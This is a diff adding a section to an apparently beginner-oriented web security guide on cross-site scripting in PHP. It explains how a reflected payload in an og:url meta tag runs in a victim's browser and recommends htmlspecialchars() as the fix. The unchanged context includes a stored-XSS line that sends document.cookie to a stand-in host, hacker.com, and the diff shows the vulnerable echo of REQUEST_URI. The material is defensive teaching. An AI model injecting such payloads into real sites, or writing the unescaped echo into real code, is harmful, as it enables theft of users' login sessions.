@@ -45,6 +45,46 @@ If your website is like a mirror that directly reflects user input content, then
 **Hacker's Playbook 😈**
 > I left a comment in your article comment section: `<script>fetch('https://hacker.com/steal?cookie=' + document.cookie)</script>`. This text was stored in the database as-is. Now, any user reading this comment will have their browser automatically execute this script, sending their login cookies to my server. With the cookies, I can impersonate their identity to log into the website.
 
+**Advanced Attack Method: How Can Code from User A Steal User B's Data?**
+
+Many people wonder: "The attacker didn't modify my website, so how can they steal other users' data?" Let me explain with a complete example:
+
+1. **Attacker A creates a malicious link**
+   ```
+   https://yoursite.com/detail.php?id=1<script>steal()</script>
+   ```
+
+2. **Attacker tricks victim B through social engineering**
+   - Email: "Check out this photographer's amazing work!"
+   - Social media posts, forum comments, etc.
+
+3. **What happens when victim B clicks the link?**
+   ```php
+   // Your code (vulnerable)
+   <meta property="og:url" content="<?php echo $_SERVER['REQUEST_URI']; ?>">
+   
+   // Actual output to B's browser
+   <meta property="og:url" content="/detail.php?id=1<script>steal()</script>">
+   ```
+
+4. **Why can they steal B's data?**
+   - B is already logged into your website
+   - The malicious script runs under **your domain**, so it can:
+     - Read B's cookies (login credentials)
+     - Access B's localStorage
+     - Make requests as B
+     - Modify page content (e.g., fake login forms)
+
+**Simple Analogy**
+Imagine your website is a bank:
+- Attacker A places a "fake withdrawal slip" (malicious script) in the bank lobby
+- Customer B thinks it's legitimate and fills in their password
+- A gets B's password
+
+XSS allows attackers to place "fake withdrawal slips" (malicious code) in your "bank lobby" (website).
+
+This is why you must use `htmlspecialchars()` - it ensures all user input is displayed as plain text, not executable code.
+
 **Disaster Consequences 💥**
 
 Large-scale user account theft, personal data leakage, websites being implanted with phishing content or mining scripts.
